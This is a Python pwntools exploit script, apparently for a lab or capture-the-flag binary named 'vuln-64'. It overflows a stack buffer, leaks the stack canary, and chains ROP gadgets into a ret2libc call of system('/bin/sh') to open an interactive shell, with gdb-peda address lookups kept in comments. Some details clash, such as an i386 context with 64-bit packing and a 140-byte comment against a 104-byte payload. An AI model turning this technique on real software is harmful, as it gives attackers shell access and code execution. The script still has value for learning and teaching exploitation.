#!/usr/bin/env python3

from pwn import *

context.update(arch='i386', os='linux')


# Let's choose local vs remote
p = process("./vuln-64") 

p.recvuntil("Hello Hacker!")

###############################################################
# ret2libc payload
# WE can cause an overflow with 140 bytes + EIP 
payload = b'A'*104

p.sendline(payload)

#############################################################
# Following an example of leaking address when ASLR is active
p.recvuntil(b'A'*104)
output=p.recv(8)
leak = u64(output) 
log.info('output is {}'.format(output)) # The leaked value is printed.
leak -= 0xa
log.info('canary is {}'.format(hex(leak))) # The leaked value is printed.

#gdb-peda$ p system
#$1 = {int (const char *)} 0x7ffff7e0e330 <__libc_system>
#gdb-peda$ p exit
#$2 = {void (int)} 0x7ffff7e00590 <__GI_exit>
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 3 results, display max 3 items:
#  vuln-64 : 0x402004 --> 0x68732f6e69622f ('/bin/sh')
#  vuln-64 : 0x403004 --> 0x68732f6e69622f ('/bin/sh')
#libc.so.6 : 0x7ffff7f58031 --> 0x68732f6e69622f ('/bin/sh')
#gdb-peda$ ropsearch  "pop rdi" 0x00007ffff7de8000  0x00007ffff7f3d000
#Searching for ROP gadget: 'pop rdi' in range: 0x7ffff7de8000 - 0x7ffff7f3d000
#0x00007ffff7de9725 : (b'5fc3')  pop rdi; ret


system   = 0x7ffff7e0e330
exit_add = 0x7ffff7e00590
binsh    = 0x402004
poprdi   = 0x00007ffff7de9725
ret      = 0x00401016

payload = b'A'*104
payload += p64(leak)
payload += b'\x00\x00\x00BBBBB'
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
payload += p64(exit_add)

log.info('Re-exploiting the main().')

p.sendline(payload)
p.interactive()

